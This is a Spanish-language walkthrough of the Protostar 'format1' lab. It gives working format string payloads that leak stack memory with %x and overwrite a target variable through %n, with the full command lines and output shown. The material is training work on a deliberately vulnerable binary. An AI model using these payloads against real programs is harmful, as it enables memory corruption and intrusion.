Localizamos la direccion de memoria de la variable
user@protostar:/tmp$ objdump -t format1

format1:     file format elf32-i386
..........................................
08049638 g     O .bss	00000004              target


Tenemos que localizar junto con nuestro padding donde aparecen nuestros caracteres leidos en memoria con el leak que hace. Como "target" no esta inicializada con ningun valor 
simplemente si le modificamos el valor de la variable haciendo que apunte a si misma con por ejemplo 4 bytes que es lo que escribira cuando 
printf haya impreso antes de encontrarse con el testigo de formato. De este modo la variable "target" habra tomado el valor 4 que son los caracteres que printf() escribio antes del testigo %n.

Gracias al testigo %x hemos podido volcar valores de la memoria, en este caso direcciones del stack.
user@protostar:/tmp$ ./format1 "`python -c "print 'AAAA'+'\x38\x96\x04\x08'+'BBBB'+'%x '*128+'%x '"`"
AAAA8�BBBB804960c bffff668 8048469 b7fd8304 b7fd7ff4 bffff668 8048435 bffff82c b7ff1040 
804845b b7fd7ff4 8048450 0 bffff6e8 b7eadc76 2 bffff714 bffff720 b7fe1848 bffff6d0 
ffffffff b7ffeff4 804824d 1 bffff6d0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 
bffff6e8 3c1a03f1 164e95e1 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 
8048361 804841c 2 bffff714 8048450 8048440 b7ff1040 bffff70c b7fff8f8 2 bffff822 bffff82c 0 
bffff9bc bffff9ca bffff9d5 bffff9f8 bffffa0b bffffa15 bfffff05 bfffff43 bfffff57 bfffff60 
bfffff71 bfffff79 bfffff89 bfffff96 bfffffcc bfffffd8 0 20 b7fe2414 21 b7fe2000 10 fabfbff 
6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 8048340 b 3e9 c 3e9 d 3e9 e 3e9 17 0 19 
bffff80b 1f bffffff2 f bffff81b 0 0 0 5000000 71a68872 584761fb 3d6c8e12 692b4ce1 363836 
2f2e0000 6d726f66 317461 41414141 8049638 42424242 user@protostar:/tmp$ 


41414141 8049638 42424242
So nice! hemos podido volcar justo los valores de los primeros parametros y alcanzar su posicion!!

Ahora afinamos quitando el padding para que sea justo la ultima en el volcado la direccion de memoria de nuestra variable "target"
user@protostar:/tmp$ ./format1 "`python -c "print '\x38\x96\x04\x08'+'%x '*128+'%x '"`"
8�804960c bffff668 8048469 b7fd8304 b7fd7ff4 bffff668 8048435 bffff834 b7ff1040 804845b b7fd7ff4 8048450 0 bffff6e8 b7eadc76 2 bffff714 
bffff720 b7fe1848 bffff6d0 ffffffff b7ffeff4 804824d 1 bffff6d0 b7ff0626 b7fffab0 b7fe1b28 b7fd7ff4 0 0 bffff6e8 fa4505de d01193ce 0 0 0 2 8048340 0 b7ff6210 
b7eadb9b b7ffeff4 2 8048340 0 8048361 804841c 2 bffff714 8048450 8048440 b7ff1040 bffff70c b7fff8f8 2 bffff82a bffff834 0 bffff9bc bffff9ca bffff9d5 bffff9f8 bffffa0b bffffa15 bfffff05 bfffff43 bfffff57 bfffff60 bfffff71 bfffff79 bfffff89 bfffff96 bfffffcc bfffffd8 0 20 b7fe2414 21 b7fe2000 10 fabfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 
8 0 9 8048340 b 3e9 c 3e9 d 3e9 e 3e9 17 0 19 bffff80b 1f bffffff2 f bffff81b 0 0 0 1a000000 f2de5aa2 ff5082d4 6da847f9 69995f0a 363836 0 0 2f2e0000 6d726f66 317461 8049638 user@protostar:/tmp$ 



EXPLOITATION:
Escritura de 4 bytes usando el testigo de formato %n para la modificacion de la variable justo en el argumento 128. Done! Variable modificada.
user@protostar:/tmp$ ./format1 "`python -c "print '\x38\x96\x04\x08'+'%x '*128+'%n '"`"
8�804960c bffff668 8048469 b7fd8304 b7fd7ff4 bffff668 8048435 bffff834 b7ff1040 804845b b7fd7ff4 8048450 0 
bffff6e8 b7eadc76 2 bffff714 bffff720 b7fe1848 bffff6d0 ffffffff b7ffeff4 804824d 1 bffff6d0 b7ff0626 b7fffab0 b7fe1b28 
b7fd7ff4 0 0 bffff6e8 556e4ed1 7f3ad8c1 0 0 0 2 8048340 0 b7ff6210 b7eadb9b b7ffeff4 2 8048340 0 8048361 
804841c 2 bffff714 8048450 8048440 b7ff1040 bffff70c b7fff8f8 2 
bffff82a bffff834 0 bffff9bc bffff9ca bffff9d5 bffff9f8 bffffa0b 
bffffa15 bfffff05 bfffff43 bfffff57 bfffff60 bfffff71 bfffff79 bfffff89 
bfffff96 bfffffcc bfffffd8 0 20 b7fe2414 21 b7fe2000 10 fabfbff 6 1000 11 64 3 8048034 4 20 5 7 7 b7fe3000 8 0 9 
8048340 b 3e9 c 3e9 d 3e9 e 3e9 17 0 19 bffff80b 1f bffffff2 f bffff81b 0 0 0 b2000000 57186d24 c2d75541 12b62ac9 6978f3c7 363836 0 0 2f2e0000 6d726f66 317461  you have modified the target :)


